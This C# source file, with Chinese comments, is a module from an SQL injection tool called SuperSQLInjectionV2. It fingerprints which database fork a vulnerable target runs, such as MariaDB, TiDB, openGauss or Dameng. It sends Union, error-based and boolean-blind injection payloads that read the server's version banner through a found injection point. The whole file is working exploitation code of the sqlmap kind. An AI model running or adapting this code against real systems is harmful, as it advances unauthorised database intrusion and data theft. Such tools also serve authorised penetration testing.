using SuperSQLInjectionV2.Models;
using SuperSQLInjectionV2.Models.Data;
using SuperSQLInjectionV2.Payload;
using SuperSQLInjectionV2.Tools.Http;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;

namespace SuperSQLInjectionV2.Tools.Inject
{
    /// <summary>
    /// 族→fork精确识别（sqlmap fingerprint fork探针同款）：
    /// 检测命中族宿主库（PostgreSQL/Oracle/MySQL等）后，用 banner 特征词判定具体 fork/衍生库
    /// （金仓/openGauss/达梦/MariaDB/TiDB/CockroachDB等），库型一律保持族宿主（取数=族模板+fork overlay差异文件），
    /// Fork名记入注入点/注入记录/上下文供展示与审计。
    /// 通道策略：Union/报错直取banner标量匹配特征词（1包）；
    /// 布尔盲注把特征词包成 like 布尔探针用 TruthOracle 判定（每候选1包，命中即停；fork仅探测banner特征鲜明的名单）；
    /// 时间/堆叠通道不识别（探测成本高/无回显），保持空Fork名。识别失败一律不改动检测结论。
    /// </summary>
    public static class DbVariantResolver
    {
        /// <summary>fork识别结果：DbType=族宿主库型（fork化后不再变更库型）；ForkName=fork显示名（空=未识别或非fork）</summary>
        public readonly struct VariantResult
        {
            public VariantResult(DBType dbType, string forkName)
            {
                DbType = dbType;
                ForkName = forkName;
            }
            public DBType DbType { get; }
            public string ForkName { get; }
        }

        /// <summary>盲注通道fork探测名单（version()/banner中确定出现自身名称的fork，其余fork盲探为纯浪费请求）</summary>
        private static readonly string[] BlindForkShortlist = { "mariadb", "tidb", "cockroachdb", "yugabytedb" };

        /// <summary>banner文本按探针表+fork注册表识别fork显示名（不命中返回空串）</summary>
        public static string IdentifyFork(string? banner, DBType family)
        {
            if (string.IsNullOrWhiteSpace(banner))
            {
                return "";
            }
            //探针表优先（forkMode变体：金仓/openGauss/达梦，特征词与显示名精确登记）
            foreach ((DBType f, string _, string matchWord, string forkName) in DbProfile.ForkProbes)
            {
                if (f == family && banner.Contains(matchWord, StringComparison.OrdinalIgnoreCase))
                {
                    return forkName;
                }
            }
            //其次fork注册表归一化包含匹配（MariaDB/TiDB等纯族模板复用者）
            string norm = DbProfile.NormName(banner);
            foreach (string fork in DbProfile.Get(family).Forks)
            {
                if (norm.Contains(fork, StringComparison.Ordinal))
                {
                    return DbProfile.ForkDisplayNames.TryGetValue(fork, out string? display) ? display : fork;
                }
            }
            return "";
        }

        /// <summary>
        /// 按注入点通道执行fork识别。Union/Error通道依赖调用方已按族初始化PayloadFactory（GUI/CLI取数前置流程均满足）。
        /// 识别失败/异常返回族库型+空Fork名
        /// </summary>
        public static async Task<VariantResult> ResolveAsync(AppConfig config, InjectPoint hit)
        {
            DBType family = hit.DBType;
            var probes = DbProfile.ForkProbes.Where(p => p.Family == family).ToList();
            bool hasForks = DbProfile.Get(family).Forks.Length > 0;
            if ((probes.Count == 0 && !hasForks) || string.IsNullOrEmpty(hit.RequestTxt))
            {
                return new VariantResult(family, "");
            }
            try
            {
                if (hit.InjectType == InjectType.Union || hit.InjectType == InjectType.Error)
                {
                    string scalar = probes.Count > 0 ? probes[0].BannerScalar : DbProfile.BannerScalarOf(family) ?? "";
                    if (string.IsNullOrEmpty(scalar))
                    {
                        return new VariantResult(family, "");
                    }
                    string payload = hit.InjectType == InjectType.Union
                        ? PayloadFactory.BPTool.UnionAll(scalar, hit.SumColumnCount, hit.ShowColumnIndex, hit.UnionFill)
                        //报错通道按vector模式三分支构造：裸QUERY槽塞裸表达式，vector模式包ConcatData标记，普通报错走ErrorData模板；
                        //此前一律ErrorData，vector发送期再叠触发函数导致双重包装（EXTRACTVALUE套updatexml）
                        : config.DataConfig.IsBareVectorQuery
                        ? scalar
                        : config.DataConfig.IsVectorMode
                        ? PayloadFactory.BPTool.ConcatData(new List<string> { scalar })
                        : PayloadFactory.BPTool.ErrorData(scalar);
                    HttpRequest hr = new HttpRequest(config, hit.RequestTxt);
                    hr.Payload = payload;
                    HttpResponse resp = await HTTPTool.SendRequestRetryAsync(hr).ConfigureAwait(false);
                    string banner = DataComm.ParseUnionOrErrorData(resp, payload);
                    //长banner被截断时兜底抢救部分数据（特征词通常在banner前段，截断不影响匹配）
                    if (string.IsNullOrWhiteSpace(banner) && DataComm.IsTruncatedMarker(resp, payload))
                    {
                        banner = DataComm.ParseTrimmed(resp, payload);
                    }
                    string fork = IdentifyFork(banner, family);
                    if (!string.IsNullOrEmpty(fork))
                    {
                        Log.Success("Fork库识别：banner特征命中 → " + family + " 族fork为 " + fork + "（banner：" + TrimBanner(banner) + "）");
                    }
                    return new VariantResult(family, fork);
                }
                if (hit.InjectType == InjectType.Blind)
                {
                    //布尔盲注通道：like探针逐候选判定（复用命中点的判定依据：关键字/正则/状态码）
                    foreach ((DBType _, string scalar, string matchWord, string forkName) in probes)
                    {
                        config.CheckStop();
                        string probe = scalar + " like '%" + matchWord + "%'";
                        if (await ProbeBool(config, hit, probe).ConfigureAwait(false))
                        {
                            Log.Success("Fork库识别：布尔探针命中（" + probe + " 为真）→ " + family + " 族fork为 " + forkName);
                            return new VariantResult(family, forkName);
                        }
                    }
                    //注册表fork探测（仅banner特征鲜明的短名单，控制发包量）
                    string? forkScalar = DbProfile.BannerScalarOf(family);
                    if (!string.IsNullOrEmpty(forkScalar))
                    {
                        foreach (string forkKey in BlindForkShortlist)
                        {
                            if (!DbProfile.Get(family).Forks.Contains(forkKey, StringComparer.OrdinalIgnoreCase))
                            {
                                continue;
                            }
                            config.CheckStop();
                            string probe = forkScalar + " like '%" + forkKey + "%'";
                            if (await ProbeBool(config, hit, probe).ConfigureAwait(false))
                            {
                                string fork = DbProfile.ForkDisplayNames.TryGetValue(forkKey, out string? display) ? display : forkKey;
                                Log.Success("Fork库识别：布尔探针命中（" + probe + " 为真）→ " + family + " 族fork为 " + fork);
                                return new VariantResult(family, fork);
                            }
                        }
                    }
                }
            }
            catch (Exception e)
            {
                //fork识别失败不影响检测结论与取数主链路
                Log.SysLog("Fork库识别失败（保持族类型" + family + "）：" + e.Message);
            }
            return new VariantResult(family, "");
        }

        /// <summary>布尔通道单发探针判定（like探针为真即命中）</summary>
        private static async Task<bool> ProbeBool(AppConfig config, InjectPoint hit, string probe)
        {
            HttpRequest hr = new HttpRequest(config, hit.RequestTxt);
            hr.Payload = probe;
            HttpResponse resp = await HTTPTool.SendRequestRetryAsync(hr).ConfigureAwait(false);
            return TruthOracle.IsTrue(resp, hit.CheckValue, hit.Revers, hit.BoolInjectType,
                hit.SimilarTemplate, hit.SimilarMode, hit.SimilarCutoff, hit.DynamicFeatures);
        }

        private static string TrimBanner(string? banner)
        {
            if (string.IsNullOrEmpty(banner))
            {
                return "";
            }
            string b = banner.Replace('\n', ' ').Trim();
            return b.Length > 60 ? b.Substring(0, 60) + "…" : b;
        }
    }
}
